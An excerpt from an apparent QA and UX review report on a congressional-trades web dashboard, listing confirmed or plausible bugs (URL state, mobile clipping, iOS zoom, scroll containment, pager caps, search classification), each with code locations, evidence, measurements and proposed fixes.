- **Where:** app/src/ui/dashboardHtml.ts:10856,11816,11991,12544  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** State that was dismissed is resurrected on reload/share because the URL is never cleaned.
- **Impact:** Confusing re-opens; shared links carry unintended context; the auth_error case makes the site look permanently broken to that visitor until they edit the URL.
- **Fix:** On close (drawer, pricing, login) and in handleAuthQueryParams delete the corresponding params via replaceState; on tab change build the URL from `view` + filter params only.
- **Evidence:** origin/main dashboardHtml.ts confirmed exact: `closeDrawer` (10856-10860) and `closePricing` (11816-11820) only toggle CSS classes, no URLSearchParams mutation; `handleAuthQueryParams` (11991-12005) scrubs only `login`, `checkout`, `billing`; `openDeepLink` (12544-12573, function starts exactly at 12544) reads `ticker/member/trade/auth_error/pricing` and never calls `.delete()` on any of them — confirmed by full read of the function body, which on an auth_error branch calls `openLogin()` and returns without touching the URL, so a reload re-triggers the same branch.
- **Panel:** qa-bughunt — Read the full closeDrawer/closePricing/handleAuthQueryParams/openDeepLink function bodies in origin/main; all line numbers exact, and confirmed openDeepLink's apple_web_not_configured branch reopens the login modal with no URL cleanup, matching the 'modal + error again on reload' repro claim. · `qa-bughunt/QABUGHUNT-10`

#### 140. [P2] Trades card meta line clips the last item mid-word ('9d a', '2d ag') because .fc-row2 is display:flex with text-overflow:ellipsis

- **Where:** app/src/ui/dashboardHtml.ts:536 (.fc-row2), :4436 (row build)  ·  **Surface:** Web · mobile  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Once the row became a flex container (avatar + member + owner + filed-ago), the ellipsis rule stopped working; the trailing relative time is cut wherever the card edge falls — on most 390px rows and every 360/320px row.
- **Impact:** Truncated, unreadable 'when was this filed' text on the primary mobile list; looks broken.
- **Fix:** Give `.fc-filed` `flex:0 0 auto` and let `.fc-member` be the shrinking item (`min-width:0; overflow:hidden; text-overflow:ellipsis`), or drop `display:flex` and inline the avatar.
- **Evidence:** mobile/trades-bottom.png rows read 'JOINT · 2d ag' and 'JOINT · 9d a'. Live re-measure at 390px: 35 of 50 `.fc-row2` rows have scrollWidth > clientWidth and the `.fc-filed` span is clipped (e.g. 'Senate · John Boozman · R-AR · Joint · 2d ago'); at 320px the time is fully hidden. dashboardHtml.ts:536 `.fc-row2 { font-size: 12px; … overflow: hidden; text-overflow: ellipsis; white-space: nowrap; display: flex; align-items: center; gap: 6px; }`; :4426 `<span class="fc-filed" title="Official filed time">`; only `.fc-owner` (:540) has flex:0 0 auto.
- **Panel:** web-mobile — Reproduced on live at 390px (35/50 rows clipped) and 320px; CSS quoted from origin/main :536. · `web-mobile/WEBMOBILE-02`

#### 141. [P2] No scroll lock or overscroll containment when a bottom sheet / modal is open — background page scroll-chains on touch

- **Where:** app/src/ui/dashboardHtml.ts (no scroll-lock implementation found)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** When the sheet's inner scroll reaches its end, iOS/Android continue the gesture into the document, scrolling the Trades list under the sheet; on close the user has lost their place.  Modals also let the page scroll behind the dimmed overlay.
- **Impact:** Disorienting; page position lost after every drawer; classic mobile jank.
- **Fix:** Add `overscroll-behavior: contain` to `.drawer-panel`, `.modal`, `.acct-mobile-menu`; toggle a `body.sheet-open { overflow:hidden; }` (position:fixed + stored scrollY for iOS) in openDrawer/closeDrawer/openLogin/openPricing.
- **Evidence:** Live 390px with the trade sheet open: body/html overflow 'clip visible' (overflow-x:clip only, :1825), `.drawer-panel` overscroll-behavior 'auto'. openDrawer() :10823-10855 / closeDrawer() :10856-10860 only add/remove the 'open' class and manage focus; openLogin() :11689 / openPricing() :11790 likewise. grep of origin/main dashboardHtml.ts for `overscroll-behavior`, `overflow = 'hidden'`, `inert` → 0 matches. Sheet content ~990px in a ~743px scroller, so the inner scroll ends and the gesture chains to the document.
- **Panel:** web-mobile — Greps and function bodies verified on origin/main (line refs corrected to :10823-10860); computed styles reproduced on live. · `web-mobile/WEBMOBILE-05`

#### 142. [P2] Selects keep 12px font on phones (time-window pill, mobile Sort, rows-per-page) → iOS Safari auto-zooms the page on focus

- **Where:** app/src/ui/dashboardHtml.ts:1597 (.pill-select-el), :815 (.pager select)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Three of the four form controls on the Trades toolbar trigger the iOS focus-zoom, after which the sticky header/filters/tab bar are misaligned until the user pinches out.
- **Impact:** Jarring zoom-in on every sort / time-window / rows change on iPhone.
- **Fix:** Add `font-size:16px` for these selects inside the ≤768px block with matching specificity (`.pill-select-el`, `.pager select`, `#mobileSortKey`), keeping visual size via `zoom`/transform if needed.
- **Evidence:** Live 390px computed: #tradesGlobalWindow 12px, #mobileSortKey 12px, `.pager select` 12px, #qSearch 16px. The mobile reset :1905 `input, select, .btn { font-size:16px; }` is beaten by :1594-1598 `.pill-select-el { … font:600 12px var(--sans); }` and :815 `.pager select { padding:5px 9px; font-size:12px; width:auto; }` (higher specificity). Safari zooms into any focused form control whose font-size < 16px.
- **Panel:** web-mobile — 12px computed sizes reproduced on live; CSS lines quoted from origin/main.  The iOS zoom itself is inferred (well-documented WebKit behaviour), not observed. · `web-mobile/WEBMOBILE-07`

#### 143. [P2] Filter chip row is overflow:visible inside html overflow-x:clip → 4th (trade-type) chip is clipped and unreachable on ≤360px phones

- **Where:** app/src/ui/dashboardHtml.ts:1970-1979 (#tradesSharedFilters/#trendsSharedFilters), :1825 (html overflow-x:clip)  ·  **Surface:** Web · mobile  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** PR #2017 forced one row and turned off horizontal scrolling; it fits at 390px only.  Galaxy S/A-series (360), iPhone SE 1st gen and Android 'small' (320) lose part or most of the direction filter with no way to reach it.
- **Impact:** Core filter partially/wholly unreachable on a large share of Android phones.
- **Fix:** Restore `overflow-x:auto` with hidden scrollbar and edge fade, or collapse chip labels further below 375px (`@media (max-width:374px)`), or let the row wrap.
- **Evidence:** Live 320x568 (screenshot): direction chip spans x=288→367 in a 320px viewport (47 of 79px clipped), `#tradesSharedFilters` overflow-x visible, scrollWidth 355 vs clientWidth 296, document scrollWidth 320 (no way to scroll); at 360px it spans 288→367 (7px clipped). dashboardHtml.ts:1963-1966 `#tradesSharedFilters, #trendsSharedFilters { display:flex; flex-wrap:nowrap; … overflow: visible; }`, :1825 `html, body { … overflow-x:clip; }`, :1892 `main { … overflow-x:clip; }`. Pre-#2017 live had `overflow-x:auto` (NOTES.md (f): chip 'cut off at the right edge until scrolled'); #2017 (c845af79) forced one row and removed the scroll.
- **Panel:** web-mobile — Reproduced on live at 320px (chip 288-367, docScroll 320); CSS quoted from origin/main. · `web-mobile/WEBMOBILE-08`

#### 144. [P2] Trends dashboard on phone is ~10-12k CSS px tall with every <details> section default-open (still open since 2026-08-10 review P1-7)

- **Where:** app/src/ui/dashboardHtml.ts:2915-3043 (all <details ... open>)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-7)
- **What:** First-time phone visitors land on a wall of 12 expanded sections; the HIDE cues exist but nothing is collapsed by default.
- **Impact:** First-screen overload and long scroll to reach lower sections; slower initial layout on phones.
- **Fix:** On ≤768px keep Snapshot, What Is Being Traded and Consensus Moves open and collapse the rest (persist user choice in localStorage).
- **Evidence:** mobile/trends-full.png is 1170×37,017 px (≈12,339 CSS px); live 390px after #2020 removed Largest Buys/Sells: document scrollHeight 10,264 CSS px (~12 screens), 12 of 12 `#view-trends details` open. origin/main has 12 `<details class="section trends-fold" open>` and no mobile default-collapse code (grep `removeAttribute('open')` → none). docs/reviews/2026-08-10-web-ui-expert-review.md:134 '#### P1-7 — Trends length + default-all-open on mobile'.
- **Panel:** web-mobile — 12/12 details open and 10,264px height measured on live post-#2020 (capture was 12,339px pre-#2020); prior-review reference verified at :134. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-05 · `web-mobile/WEBMOBILE-13`

#### 148. [P2] Opening a drawer by click never updates the URL; only the buried "Copy link" produces a shareable address, and it drops the current view

- **Where:** app/src/ui/dashboardHtml.ts:10823-10852  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Users cannot copy the address bar to share what they are looking at, refresh loses the open drawer, and the only share affordance sits at the very bottom of a long scrolling drawer.  The generated link also discards `view=` and filters, so recipients land on Trends rather than the Trades page the sender was on.
- **Impact:** Sharing and bookmarking of the app's most valuable objects (a politician, a ticker, a trade) is unreliable.
- **Fix:** Write `?trade=|member=|ticker=` into the URL on open (pushState) and remove it on close; keep `view=` in copied links; move Copy link into the drawer top bar.
- **Evidence:** dashboardHtml.ts@origin/main:10824-10858 openDrawer() sets classes only; :10863-10871 copyLinkHtml click handler builds `new URL(window.location.origin + '/')` + one param (a trade opened from Trades copies `/?trade=…`, which reopens over Trends).  closeDrawer (:10854-10858) never touches the URL, so a deep-linked `?trade=` survives close and refresh reopens it.  NOTES.md (a) Drawers: "Opening a drawer by click does not change the URL"; desktop/trades-row-expanded.png URL unchanged vs desktop/trade-detail.png `?trade=aa349372…`.
- **Panel:** web-ux-desktop — Quoted openDrawer/closeDrawer/copyLink handler; the copy handler starts from `origin + '/'` so view/filters are dropped by construction. · merged: seo-social/SEOSOCIAL-14, growth-onboarding/GROWTHONBOARDING-13 · `web-ux-desktop/WEBUXDESKTOP-03`

#### 149. [P2] Pager advertises unreachable pages: "Page 1 of 1,798" at All Time while anonymous browsing stops at page 41

- **Where:** app/src/ui/dashboardHtml.ts:4821-4858  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-6)
- **What:** The page-count label is computed from the full total while Next/Last silently stop at the public cap; the user reaches "Page 41 of 1,798" with Next disabled and only a transient toast explaining why.
- **Impact:** Confusing pager, looks like a bug rather than a Premium boundary.
- **Fix:** Cap the displayed count at reachable pages and add a persistent line "Showing the first 2,000 of 89,864 — full history via CSV export (Premium)" beside the pager (as recommended 2026-08-10, still not done).
- **Evidence:** dashboardHtml.ts@origin/main:4846 `var pageCount = Math.max(1, Math.ceil(total / tradesPageSize));` shown at :4857 `'Page ' + fmtCount(tradesPage + 1) + ' of ' + fmtCount(pageCount)`; :4821-4825 maxReachableTradesPage clamps to `MAX_PUBLIC_TRADES_OFFSET / tradesPageSize`; security/botDefense.ts:53 `MAX_PUBLIC_TX_OFFSET = 2_000`.  Live: `curl /api/transactions?limit=1` → `total: 89864` (=1,798 pages at 50/pg); `offset=2050` → 400 "offset beyond 2000 is not available on the public feed".
- **Panel:** web-ux-desktop — Code quoted at cited lines; curl re-run (total 89,864; offset 2050 → 400).  Prior review P1-6 text confirmed at docs/reviews/2026-08-10-web-ui-expert-review.md:127-131. · merged: qa-bughunt/QABUGHUNT-15, prior-review-followup/PRIORREVIEWFOLLOWUP-04, api-contract/APICONTRACT-16, ios-shipped-app/IOSSHIPPEDAPP-40 · `web-ux-desktop/WEBUXDESKTOP-06`

#### 150. [P2] Directory hides the shared time/branch/party/side filter bar, yet the member drawer opened from it reports "Trade Stats (3 Months)" using that hidden state

- **Where:** app/src/ui/dashboardHtml.ts:3057-3070 (Directory toolbar), 11258-11260 (member drawer window label)  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The Directory disclaims "trade counts cover the full record", but one click later the drawer switches to the invisible global window/branch/party/side filters.  From the Directory the user cannot see or change those filters, so numbers appear to contradict each other and cannot be adjusted without leaving the tab.
- **Impact:** Filter state is not truthful across views; users misread activity levels (4 vs all-time count).
- **Fix:** Show the shared filter row on Directory too (or a compact window pill in the drawer header) and echo the active branch/party/side in the drawer stats heading.
- **Evidence:** dashboardHtml.ts@origin/main:3057-3094 #view-people has no shared-filters toolbar (only `#peopleQ`, `#peopleChamber`, Refresh) and its intro says "Trade counts cover the full record, not the timeframe set on Trades or Trends"; :11215 openMember fetches `'member/' + id + '?' + trParams()` and :11259 titles the section `'Trade Stats (' + windowLabel(getTrWindow()) + ')'`.  desktop/politician-detail.png: Directory footer says "trade counts are all time" while the drawer says TOTAL TRADES 4 (Past 3 Months) with no control on screen to change the window.
- **Panel:** web-ux-desktop — Markup and openMember quoted; screenshot re-opened (drawer 'TRADE STATS (PAST 3 MONTHS)' over a Directory that says counts are all time). · `web-ux-desktop/WEBUXDESKTOP-09`

#### 151. [P2] Drill-in inside the drawer (trade → politician → company) has no Back; only Close, which discards the whole stack

- **Where:** app/src/ui/dashboardHtml.ts:3423  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** From a trade the user taps Politician Details, then a ticker in Most-Traded, then a trade in that list — three levels deep with no way back except closing and re-finding the original row.
- **Impact:** Exploration is punished; users lose their place.
- **Fix:** Keep a small in-drawer history stack and show "‹ Back" in the top bar when depth > 1 (also lets browser Back pop it once history is wired).
- **Evidence:** dashboardHtml.ts@origin/main:3421-3423 drawer markup has only `<span id="drawerTopbarTitle">` and `<button class="drawer-close">✕</button>`; :10826-10829 comment: "Drill-in navigation (trade -> asset -> member, etc.) calls openDrawer() again while it's already open" — body innerHTML is replaced, nothing is stacked.  desktop/trades-row-expanded.png shows Politician Details / Company Details buttons with no return path.
- **Panel:** web-ux-desktop — Markup and openDrawer comment quoted; screenshot re-opened. · `web-ux-desktop/WEBUXDESKTOP-14`

#### 152. [P2] Filter or page fetch failures after first load are swallowed: no error state, no toast, stale rows remain

- **Where:** app/src/ui/dashboardHtml.ts:5333-5344  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** During an origin outage or rate limit, changing the window or clicking Next silently does nothing; the previous rows and counts stay on screen as if they matched the new filters.
- **Impact:** Users see wrong data labelled with the new filter, or think the pager is broken.
- **Fix:** On failure after initial load show a toast/inline row "Couldn't load page N — Retry" and keep pager buttons in a retry state.
- **Evidence:** dashboardHtml.ts@origin/main:5334-5338 `.catch(function (e) { if (e && e.name === 'AbortError') return 0; if (!realDataLoaded) setBanner('Could not load the live feed: ' + e.message, true); return 0; })` — once realDataLoaded is true nothing is surfaced.  NOTES.md (c): during a 502 window the background poll failed 4× and "the UI showed no visible error state".
- **Panel:** web-ux-desktop — catch handler quoted verbatim; capture notes corroborate. · `web-ux-desktop/WEBUXDESKTOP-19`

#### 169. [P2] Trades search: any 1–5 letter word is sent as a ticker, so surnames like 'Hern', 'Cruz', 'King' return zero rows

- **Where:** app/src/ui/dashboardHtml.ts:4736-4762  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The client-side classifier decides a single short alphabetic token must be a ticker and never falls back to a name search, so searching for a short politician surname (or a short state name typo) yields 'No transactions match these filters.'
- **Impact:** Search for many members (Hern, Cruz, King, Mann, Ryan, Rose…) silently fails; users assume the data is missing.
- **Fix:** When a single short token is sent, query the server with an OR semantics (add a `q=` free-text param that matches ticker OR member name server-side), or fall back to `memberName` when the ticker query returns total 0.  Add tests for 'Hern' and 'NVDA'.
- **Evidence:** origin/main dashboardHtml.ts:4743-4761 confirmed byte-for-byte: `if (/^[A-Za-z]{1,5}$/.test(tok) && !isState && !/^(dem|rep|ind|gop|other|democrat|republican|independent)s?$/i.test(tok)) { if (tokens.length === 1) tickerHint = up; ... }` then `if (tickerHint) p.set('ticker', tickerHint);` at line 4761. Live curl `/api/transactions?from=2026-05-21&limit=1&ticker=HERN` -> total 0; `memberName=Hern` -> returns Kevin Hern (house-ok01-kevin-hern) trade. `ticker=CRUZ` -> 0, `ticker=KING` -> 0 (all reproduced 2026-08-19).
- **Panel:** qa-bughunt — Reproduced live exactly as claimed.  Code line numbers verified exact against origin/main. · `qa-bughunt/QABUGHUNT-03`

#### 170. [P2] State/party search terms filter only the currently loaded page; count and pager keep the unfiltered totals

- **Where:** app/src/ui/dashboardHtml.ts:4753-4756  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Typing a state or party word gives a page-local filter: page 1 shows the few matching rows out of 50, the header says e.g. '1-3 of 2,178', and pages 2..44 are unrelated unfiltered pages re-filtered client-side (often empty).
- **Impact:** Search results are incomplete and the counts are wrong for the exact terms the placeholder invites ('state, party').
- **Fix:** Add server-side `state=` and `party=` handling to `/api/transactions` (party already exists as `partyBuckets`; map party words to it) and send them from `applySearchToServerParams`; until then, hide state/party from the placeholder.
- **Evidence:** origin/main dashboardHtml.ts:4753-4756 confirmed byte-for-byte: `} else if (isState) { // state — client filter only (server has no state= on public feed) } else if (/^(dem|rep|...)/i.test(tok)) { // party — client filter }` — nothing is put on the server params for either branch. renderTrades() (function starts at line 4779) filters `TRADES` (the 50-row page) through `makeTradesFilterMatcher()` (function at line 4766); `updateTradesCountMsg` (function at line 4830) computes '1-N of <server total>' from `totalRows`. Pagination (`tradesQueryParams`, function confirmed at exact line 5277) still walks the unfiltered corpus — no `state=`/`party=`(word) params are ever added by this code path.
- **Panel:** qa-bughunt — Code confirmed exactly at the cited lines.  The supporting function line numbers (renderTrades/updateTradesCountMsg/tradesQueryParams) in the original evidence were approximate; verified anchor points noted here. · merged: api-contract/APICONTRACT-23 · `qa-bughunt/QABUGHUNT-04`

#### 181. [P2] Delivery table overflows its card and clips STATUS/ACTIONS columns at 390px (paid controls off-screen, no scroll cue)

- **Where:** app/src/ui/dashboardHtml.ts:3157 (#subsTable), :1898 (.section > table)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Six columns cannot fit 366px; the table is technically horizontally scrollable (display:block + overflow-x:auto) but is visually clipped by the section with no scrollbar or fade.  For a signed-in Premium user the Pause/Delete/Edit ACTIONS column and STATUS are off-screen — the only management surface for a paid feature.
- **Impact:** Premium subscribers on phones cannot see or reach delivery status/actions without discovering an invisible horizontal scroll.
- **Fix:** Render deliveries as stacked cards on ≤768px (like Trades), or wrap the table in `.table-wrap` with a visible scroll cue and make Actions the first column; at minimum hide Progress/Filters on phones.
- **Evidence:** NOTES.md (h)14 and mobile/delivery-full.png: header row 'CHANNEL TARGET FILTERS PROGRESS ST…'. Live re-measure 390px: thead right = 478, table box 324 wide, table scrollWidth 444 vs clientWidth 322, parent `.section` overflow hidden. dashboardHtml.ts:3157-3158 `<table id="subsTable"><thead><tr><th>Channel</th><th>Target</th><th>Filters</th><th>Progress</th><th>Status</th><th>Actions</th>` is a direct child of `.section` (no .table-wrap); :1894 `.section { overflow:hidden; }`, :1898 `.section > table { display:block; max-width:100%; overflow-x:auto; }`.
- **Panel:** web-mobile — Measurements reproduced on live (478 / 324 / scrollWidth 444).  Signed-in rows not observable; anonymous state row confirms geometry. · merged: delivery-alerts/DELIVERYALERTS-11, qa-bughunt/QABUGHUNT-21 · `web-mobile/WEBMOBILE-03`

#### 182. [P2] 'What Is Being Traded' and other Trends tables clip their right-hand columns at 390px with no scroll cue

- **Where:** app/src/ui/dashboardHtml.ts:2937 (#trTickers), :1898 (.section > table)  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Dense analytics tables are wider than the phone card; the third/fourth columns and headers are truncated mid-glyph.  Users see broken numbers rather than a scrollable table.
- **Impact:** Key Trends data unreadable on phones without accidental horizontal drag.
- **Fix:** Convert to a two-line ticker row on phones (politicians count under the trades cell) or add a right-edge fade + `scroll-snap`, and shrink the mono font/padding in that table below 400px.
- **Evidence:** Live 390px: #trTickers table right edge 489 vs `.table-wrap` right 357, wrap scrollWidth 456 vs clientWidth 324, visible headers Asset | Trades ▼ | Politicians | Net Flow (est column already hidden by :2051 `#trTickers td.est, #tableTrTickers th.est { display: none; }`); `.table-wrap` overflow-x:auto (:217) inside `.section { overflow:hidden }` (:1894) — scrollable but nothing indicates it. mobile/trends.png shows the third column cut at the card edge.
- **Panel:** web-mobile — Reproduced on live (456 vs 324); four visible columns rather than three — wording adjusted. · `web-mobile/WEBMOBILE-10`

#### 183. [P2] Directory renders all 381 rows in a nested 70vh scroll container on phones (scroll-within-scroll, no paging)

- **Where:** app/src/ui/dashboardHtml.ts:682  ·  **Surface:** Web · mobile  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** A 591px scroller inside an 844px page: swipes alternate between page scroll and list scroll depending on where the finger lands; the fixed bottom tab bar covers the scroller's lower rows; 17.9k px of rows is a poor thumb experience with no pagination or A–Z jump.
- **Impact:** Frustrating browsing of the politician list on phones; a common entry point.
- **Fix:** On ≤768px drop the max-height (let the page scroll) and paginate 50/page like iOS, or add an alphabet jump bar; keep the sticky thead only when the wrap scrolls.
- **Evidence:** Live 390px: wrap height 591px, scrollHeight 17,894px, overflow-y auto, 381 tbody rows, no `.pager` in #view-people (iOS app pages the same list). dashboardHtml.ts:682-687 `.people-table-wrap { max-height: min(70vh, 720px); overflow-x: hidden; overflow-y: auto; -webkit-overflow-scrolling: touch; }`; :2092 `.people-table-wrap td { font-size: 12px; }`. mobile/directory.png shows the inner scrollbar and the last visible row under the tab bar (NOTES (h)13).
- **Panel:** web-mobile — All numbers reproduced on live; CSS quoted from origin/main. · `web-mobile/WEBMOBILE-11`

#### 184. [P2] 166 sub-24px tap targets on the mobile Trends view (ⓘ 9×11px, member links, 22px ticker rows); pager/sort buttons 36×24 / 34×26 on Trades

- **Where:** app/src/ui/dashboardHtml.ts:393 (.info-tip), :1958 (pager-tools min-height:36px)  ·  **Surface:** Web · mobile  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Most in-table affordances are text-sized; the info tips that explain metrics are 9px glyphs; paging controls are below the 44px iOS / 48dp Android minimum.
- **Impact:** Mis-taps (open the wrong ticker/member), unreachable explanations, Lighthouse a11y failures.
- **Fix:** Give ⓘ a 28×28 hit box (padding, `display:inline-flex`), make table rows the tap target (row-level data-asset/data-member) with ≥40px row height on phones, and set `.pager-controls button, .trades-sort-mobile .btn { min-height:40px; min-width:40px }` in the mobile block.
- **Evidence:** Live 390px: 166 interactive elements (a/button/.clickable/.info-tip) under 24px in #view-trends; first `.info-tip` 9×11px; Trades pager buttons 36×24; hamburger `.acct-hamburger` 38×38. Lighthouse trends-mobile: target-size FAIL 45 items, trades-mobile 29 items (lighthouse/SUMMARY.txt:9,21). CSS: :393 `.info-tip { … font-size:.82em; line-height:1 }`, :668 `.btn.sm { padding:5px 10px; font-size:12px }`, :808 `.pager-controls button { … min-width:2.25rem }`.
- **Panel:** web-mobile — 166 count, 9×11 info-tip, 36×24 pager and 38×38 hamburger reproduced on live; Lighthouse lines verified. · `web-mobile/WEBMOBILE-14`

#### 199. [P2] Bottom sheet uses height:88vh inside a fixed inset:0 container — on iOS Safari with toolbars visible the sheet top (title + Close) can sit above the visible area

- **Where:** app/src/ui/dashboardHtml.ts:1096 (.drawer), :2062 (.drawer-panel height:88vh)  ·  **Surface:** Web · mobile  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)  ·  **Quick win**
- **What:** iOS Safari's `vh` is the large viewport (844) while the fixed inset:0 container is the visible (small) viewport (~660-710 with URL bar + toolbar); a bottom-anchored 88vh (743px) child therefore overflows above the top of the container by ~30-80px until the user scrolls to collapse Safari chrome.  Not observable in the Chrome-emulated captures (innerHeight = 844).
- **Impact:** On first open in iOS Safari the sheet's Close control and topbar summary can be hidden; users must guess to scroll or tap the thin visible backdrop.
- **Fix:** Use `height: min(88vh, 92dvh)` / `max-height: calc(100dvh - 40px)` (or `88svh`), and add `overscroll-behavior: contain`.
- **Evidence:** dashboardHtml.ts:1096 `.drawer { position:fixed; inset:0; z-index:60; display:none; }`, :1099 `.drawer-panel { position:absolute; top:0; right:0; height:100%; … }`, :2062 mobile `.drawer-panel { top: auto; bottom: 0; height: 88vh; … }`, :1252 older rule `height:90vh`, :2104 landscape `height:92vh`. Live at 390x844 computed panel height 742.72px. Comparable elements already use dvh (:2620 `max-height: min(82vh, calc(100dvh - …))`, :2629 `max-height: 92dvh`). `.drawer-topbar` (:1101-1105) is sticky top:0 inside the panel with the Close button (:3423).
- **Panel:** web-mobile — CSS quoted exactly; the vh vs small-viewport mismatch is a well-known iOS Safari behaviour and nothing in the code guards against it, but no real iOS device/Safari was available to observe it.  Reproduction of the exact pixel loss depends on Safari chrome state. · `web-mobile/WEBMOBILE-04`

#### 200. [P2] iPad Safari falls into the phone layout: mobile block also matches (hover:none) and (pointer:coarse)

- **Where:** app/src/ui/dashboardHtml.ts:1821, 2600, 2614  ·  **Surface:** Web · mobile  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)  ·  **Quick win**
- **What:** A 1024–1366px iPad renders phone chrome: one card per row, phone-sized type, bottom tab bar, no table, no Columns chooser — while a non-touch 1024px window gets the desktop table.
- **Impact:** Degraded experience on tablets (a common finance-reading device); also cannot be verified by desktop responsive tools since it keys on pointer, not width.
- **Fix:** Scope the coarse-pointer clause to narrow viewports (`(hover:none) and (pointer:coarse) and (max-width: 900px)`) or apply only the hamburger/target-size rules to coarse pointers, not the layout swap.
- **Evidence:** dashboardHtml.ts:1821 `@media (max-width: 768px), (orientation: landscape) and (max-width: 950px) and (max-height: 520px), (hover: none) and (pointer: coarse) {` — introduced by f46240cb (#1895, merged 2026-08-16, on live). That block installs the fixed emoji bottom tab bar (:1837), hides the Trades table (:2009 `#view-trades .table-wrap { display: none; }`), single-column cards, body font 13px (:1826). Comment at :2607-2608 states the intent was iPhone 'desktop site' mode. iPadOS Safari without a trackpad reports hover:none + pointer:coarse.
- **Panel:** web-mobile — Media query and PR provenance verified; no iPad hardware to observe. iPadOS Safari's pointer:coarse/hover:none reporting is standard, so the layout swap follows from the code. · `web-mobile/WEBMOBILE-09`

#### 201. [P2] Changing page does not reset the inner table scroll position, so Next from the bottom pager lands mid/bottom of the new page

- **Where:** app/src/ui/dashboardHtml.ts:5460-5468 (no scroll reset), drawer reset at 10841  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)  ·  **Quick win**
- **What:** After scrolling the inner container to the bottom pager and clicking Next, the replaced rows render with the container still scrolled to the bottom; the user sees the tail of page 2 and has to scroll up to find its start.
- **Impact:** Every page turn costs an extra orientation scroll; feels broken.
- **Fix:** In fetchPage success, set `.table-wrap.scrollTop = 0` and scroll the top pager into view.
- **Evidence:** dashboardHtml.ts@origin/main:5309-5345 fetchPage → renderTrades() only; `grep -n "scrollTop\|scrollIntoView" dashboardHtml.ts` → 6865 (subs create row), 9461 (chart), 10842 (drawer panel), 12052-12053 (showView) — nothing touches `.table-wrap` on page change.  With .table-wrap max-height (line 222) the container keeps its previous scrollTop when innerHTML is replaced.
- **Panel:** web-ux-desktop — Code path confirmed (no scroll reset anywhere near fetchPage/renderTrades); the runtime behaviour was not reproduced in a browser but follows from the nested scroller in F07. · `web-ux-desktop/WEBUXDESKTOP-08`

#### 206. [P2] Trades table lives in a nested 78vh scroller inside a scrolling page, so headers scroll away under the sticky toolbar and wheel-scroll is captured unpredictably

- **Where:** app/src/ui/dashboardHtml.ts:222  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** Two scroll surfaces on one screen: the page scrolls ~186px, then the table scrolls internally.  Wheel input jumps between the two depending on cursor position, the sticky column headers hide behind the toolbar once the page has scrolled, and full-page capture/print cannot reach the rows.
- **Impact:** Reading and scanning 50-250 rows on desktop is harder than a plain page-scrolling table; keyboard PageDown behaves inconsistently.
- **Fix:** Let the table flow in the page (remove max-height on Trades) and make thead sticky at `top: var(--ct-header-h) + toolbar height`; or, if the inner scroller is kept, reset its scrollTop on page change and keep the header pinned to the viewport.
- **Evidence:** dashboardHtml.ts@origin/main:222 `.table-wrap { overflow-x: auto; max-height: min(78vh, 920px); …}`; :301 `#tradesHead th { position: sticky; top: 0; z-index: 4 }` (sticky to the inner box, not the viewport); :1619 `.trades-toolbars { position: sticky; top: var(--ct-header-h, 68px); z-index: 9 }`.  desktop/trades-bottom.png: rows visible directly under the sticky toolbar with no column header anywhere on screen.  NOTES.md (a): "table body lives in an internal scroll container (2,770 px of content in a 702 px box) while the page itself scrolls only ~186 px, and the column header row is not sticky — it scrolls out of view".
- **Panel:** web-ux-desktop — CSS quoted; trades-bottom.png re-opened and shows no header row while the toolbar is pinned. · merged: web-a11y/WEBA11Y-31 · `web-ux-desktop/WEBUXDESKTOP-07`

#### 252. [P3] Bad member / ticker deep links render a fake profile ('NOPE', 0 trades) instead of a not-found state — analytics endpoints return 200 with profile:null

- **Where:** app/src/ui/dashboardHtml.ts:11217  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Unknown ids are dressed up as real politicians/companies with zeros.
- **Impact:** Broken share links look like empty data; also confuses crawlers/OG consumers.
